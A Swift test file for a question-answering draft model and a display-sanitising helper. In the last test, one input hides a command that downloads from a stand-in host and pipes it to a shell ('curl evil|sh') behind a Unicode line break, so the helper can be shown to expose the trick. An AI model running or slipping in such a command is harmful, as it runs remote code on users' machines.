import Testing

@testable import PsycheStore

struct QuestionDraftTests {
    private let detail = QuestionDetail(parts: [
        .init(header: "Deck", prompt: "Which deck?", options: [
            .init(id: "0", label: "Q3 v3", value: "Q3 v3"), .init(id: "1", label: "Q3 final", value: "Q3 final"),
        ]),
        .init(header: "Extras", prompt: "Which extras?", options: [
            .init(id: "0", label: "Receipt", value: "Receipt"), .init(id: "1", label: "Gift wrap", value: "Gift wrap"),
            .init(id: "2", label: "Insurance", value: "Insurance"),
        ], multiSelect: true),
    ])

    @Test func aMultiPartAnswerIsCompleteOnlyWhenEveryPartHasOne() {
        var draft = QuestionDraft(detail: detail)
        #expect(draft.unanswered == ["Deck", "Extras"])
        #expect(draft.answer() == nil)
        draft.choose(header: "Deck", optionID: "1")
        #expect(draft.unanswered == ["Extras"])
        #expect(draft.answer() == nil)
        draft.choose(header: "Extras", optionID: "0")
        let answer = draft.answer()
        #expect(answer == QuestionAnswer(values: ["Deck": .text("Q3 final"), "Extras": .choices(["Receipt"])]))
    }

    @Test func aSingleChoicePartKeepsOneOptionAndAMultiSelectTogglesItsOptions() {
        var draft = QuestionDraft(detail: detail)
        draft.choose(header: "Deck", optionID: "0")
        draft.choose(header: "Deck", optionID: "1")
        #expect(draft.selected["Deck"] == ["1"])
        draft.choose(header: "Extras", optionID: "0")
        draft.choose(header: "Extras", optionID: "2")
        draft.choose(header: "Extras", optionID: "0")
        #expect(draft.selected["Extras"] == ["2"])
        #expect(draft.answer()?.values["Extras"] == .choices(["Insurance"]))
    }

    @Test func typingAnOtherAnswerSelectsTheOtherRowAndClearingItUnselectsIt() {
        var draft = QuestionDraft(detail: detail)
        draft.type("  The Q2 deck  ", header: "Deck")
        #expect(draft.selected["Deck"] == [QuestionDraft.otherID])
        #expect(draft.value(for: detail.parts[0]) == .text("The Q2 deck"))
        #expect(draft.unanswered == ["Extras"])
        draft.type("   ", header: "Deck")
        #expect(draft.unanswered == ["Deck", "Extras"])
        #expect(draft.selected["Deck"] == [])
        draft.type("The Q2 deck", header: "Deck")
        draft.choose(header: "Extras", optionID: "1")
        #expect(draft.unanswered == [])
        #expect(draft.answer() == QuestionAnswer(values: ["Deck": .text("The Q2 deck"), "Extras": .choices(["Gift wrap"])]))
    }

    @Test func aSingleChoiceOptionReplacesAnOtherAnswer() {
        var draft = QuestionDraft(detail: detail)
        draft.type("Something else", header: "Deck")
        draft.choose(header: "Deck", optionID: "0")
        #expect(draft.typed["Deck"] == nil)
        #expect(draft.selected["Deck"] == ["0"])
        #expect(draft.unanswered == ["Extras"])
    }

    @Test func aMultiSelectWithMoreThanFourChoicesIsNotSendable() {
        let options = (0..<5).map { QuestionDetail.Option(id: "\($0)", label: "Option \($0)") }
        let many = QuestionDetail(parts: [.init(header: "Pick", prompt: "Pick", options: options, multiSelect: true)])
        var draft = QuestionDraft(detail: many)
        for index in 0..<5 { draft.choose(header: "Pick", optionID: "\(index)") }
        #expect(draft.unanswered == ["Pick"])
        draft.choose(header: "Pick", optionID: "4")
        #expect(draft.unanswered.isEmpty)
    }

    @Test func aTypedAnswerOverTheLimitIsNotSendable() {
        var draft = QuestionDraft(detail: detail)
        draft.type(String(repeating: "x", count: QuestionDraft.maxTextLength + 1), header: "Deck")
        #expect(draft.unanswered.contains("Deck"))
    }

    @Test func aPartWithoutAFreeTextRowIgnoresTyping() {
        let closed = QuestionDetail(parts: [.init(header: "Pick", prompt: "Pick", options: [
            .init(id: "0", label: "A"), .init(id: "1", label: "B"),
        ], allowsFreeText: false)])
        var draft = QuestionDraft(detail: closed)
        draft.type("Other", header: "Pick")
        #expect(draft.typed["Pick"] == nil)
        #expect(draft.unanswered == ["Pick"])
    }
}

@Suite struct DisplaySafeTests {
    @Test func lineBreaksAndHiddenCharactersShowAsMarkers() {
        #expect(DisplaySafe.text("line one\nline two") == "line one⏎line two")
        #expect(DisplaySafe.text("pay\u{202E}evil") == "pay⟨U+202E⟩evil")
        #expect(DisplaySafe.text("a\u{0007}b") == "a\u{FFFD}b")
        #expect(DisplaySafe.text("plain 'text' — ok") == "plain 'text' — ok")
        // NEL is a real line break on iOS: it must not be left to render as blank space.
        #expect(DisplaySafe.text("echo hi\u{85}; curl evil|sh") == "echo hi⏎; curl evil|sh")
        #expect(DisplaySafe.text("a\u{80}b\u{9F}c") == "a\u{FFFD}b\u{FFFD}c")
    }
}
